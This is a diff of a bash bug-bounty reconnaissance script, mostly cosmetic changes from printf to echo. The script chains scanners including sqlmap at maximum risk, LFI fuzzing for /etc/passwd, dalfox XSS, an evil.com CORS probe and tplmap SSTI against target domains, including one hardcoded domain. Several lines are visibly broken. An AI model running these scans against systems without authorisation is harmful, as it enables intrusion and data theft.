@@ -33,8 +33,8 @@ usage() {
 
 # Subdomain enumeration
 subdomain_enum() {
-    printf "${GREEN}---------------------Starting Subdomain Enumuration---------------------\n"
-    printf "${NC}\n"
+    echo "${GREEN}---------------------Starting Subdomain Enumeration---------------------\n\n"
+    echo "${NC}\n"
     domain=$1
     temp_dir="$local_dir/$Project/temp/subdomains/$domain"
     mkdir -p "$temp_dir"
@@ -53,8 +53,8 @@ subdomain_enum() {
 
 # Check live domains
 live_domain() {
-    printf "${GREEN}---------------------Finding Live Subdomains--------------------\n"
-    printf "${NC}\n"
+    echo "${GREEN}---------------------Finding Live Subdomains--------------------\n\n"
+    echo"${NC}\n"
     domain=$1
     temp_dir="$local_dir/$Project/temp/hostalive/$domain"
     mkdir -p "$temp_dir"
@@ -70,15 +70,15 @@ live_domain() {
 # Aquatone snapshot
 snapshot() {
     domain=$1
-    printf "${GREEN}---------------------Start Taking Snap Shots---------------------\n"
-    printf "${NC}\n"
+    echo "${GREEN}---------------------Start Taking Snap Shots---------------------\n"
+    echo "${NC}\n"
     cat "$local_dir/$Project/$domain/live-subdomains.txt" | aquatone -out "$local_dir/$Project/$domain/snapshot" -silent
 }
 
 # URL scraping
 url_scrap() {
-    printf "${GREEN}---------------------Starting URL Scrapping---------------------\n"
-    printf "${NC}\n"
+    echo "${GREEN}---------------------Starting URL Scrapping---------------------\n"
+    echo "${NC}\n"
     domain=$1
     temp_dir="$local_dir/$Project/temp/urls/$domain"
     mkdir -p "$temp_dir"
@@ -99,24 +99,24 @@ url_scrap() {
 
 # Run other tools
 other_tools() {
-    printf "${GREEN}---------------------Starting Enumuration With ReconTFW, SubDomz, Nmap Automator Scan---------------------\n"
-    printf "${NC}\n"
+    echo "${GREEN}---------------------Starting Enumuration With ReconTFW, SubDomz, Nmap Automator Scan---------------------\n"
+    echo "${NC}\n"
     domain=$1
     mkdir -p "$local_dir/$Project/$domain/reconftw"
     mkdir -p "$local_dir/$Project/$domain/subdomz"
     mkdir -p "$local_dir/$Project/$domain/nmap"
 
     echo -e "${green}Running additional tools for $domain...${reset}"
-    reconftw -d "$domain" -r --deep -o "$local_dir/$Project/$domain/reconftw"
-    subdomz -d "$domain" -o "$local_dir/$Project/$domain/subdomz"
+    bash "$HOME/toolbox/recontfw/reconftw.sh" -d "$domain" -r --deep -o "$local_dir/$Project/$domain/reconftw"
+    bash "$HOME/toolbox/SubDomz/SubDomz.sh" -d "$domain" -o "$local_dir/$Project/$domain/subdomz"
     bash "$HOME/toolbox/nmapAutomator/nmapAutomator.sh" -H rootniklabs.com -t All -o "$local_dir/$Project/$domain/nmap"
 }
 
 # Vulnerability Scanning
 # XSS Testing
-Vuln() {
-    printf "${GREEN}---------------------Starting Vulnerability Scanning Scan---------------------\n"
-    printf "${NC}\n"
+vuln() {
+    echo "${GREEN}---------------------Starting Vulnerability Scanning Scan---------------------\n"
+    echo "${NC}\n"
     echo -e "${green}Finding Possible Vulnerabilities $domain...${reset}"
     domain=$1
     temp_dir="$local_dir/$Project/temp/urls/$domain"
@@ -133,7 +133,7 @@ Vuln() {
     cat "$temp_dir/waybackurls.txt" | gf ssti > "$temp_dir/ssti.txt"
     cat "$temp_dir/waybackurls.txt" | gf xss > "$temp_dir/xss.txt"
 
-    #xss
+    # xss
     cat "$temp_dir/xss.txt" | dalfox pipe > "$local_dir/$Project/$domain/temp_xss.txt"
     cat "$temp_dir/xss.txt" | dalfox pipe -o  "$local_dir/$Project/$domain/xss_results.txt"
 
@@ -141,29 +141,20 @@ Vuln() {
     cat "$temp_dir/waybackurls.txt" | grep "=" |  httpx -silent -path "$HOME/toolbox/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt" -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:" >>$local_dir/$Project/$domain/LFI_results.txt
     cat "$temp_dir/lfi.txt" | httpx -silent -path /home/kali/toolbox/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:" >> $local_dir/$Project/$domain/LFI_results.txt
 
-    #SSRF Testing
+    # SSRF Testing
     httpx -silent -l "$temp_dir/tmp-ssrf.txt" -fr | grep -o '\[[^]]\+\]' >>  $local_dir/$Project/$domain/SSRF_results.txt
 
-    #SQLi
+    # SQLi
     sqlmap -m tmp-sqli.txt --batch --random-agent --level 5 --risk 3 --dbs >> "$temp_vuln/temp_sqli.txt" && grep -A3  "available databases \[" $temp_vuln/temp_sqli.txt | grep "\[\*\]" >> "$temp_dir/SQLi.txt"
 
     # CORS
     cat cat "$temp_dir/waybackurls.txt" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done | grep "Potentional CORS Found" >> "$temp_dir/Cors.txt"
 
     #Prototype Polution
-
     cat "$local_dir/$Project/$domain/live-subdomains.txt"| anew "$temp_vuln/temp_prototype.txt"  && sed 's/$/\/?__proto__[testparam]=exploit\//' "$temp_vuln/temp_prototype.txt" | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" >> "$temp_dir/Protype-polution.txt"
-    
-    # Idor
-
-
+ 
     # SSTI
     for url in $(cat "$temp_dir/waybackurls.txt"); do python3 tplmap.py -u $url; print $url; done >> "$temp_dir/template-injection.txt"
-
-    # RCE
-
-    # open-redirection
-
 
 }
 
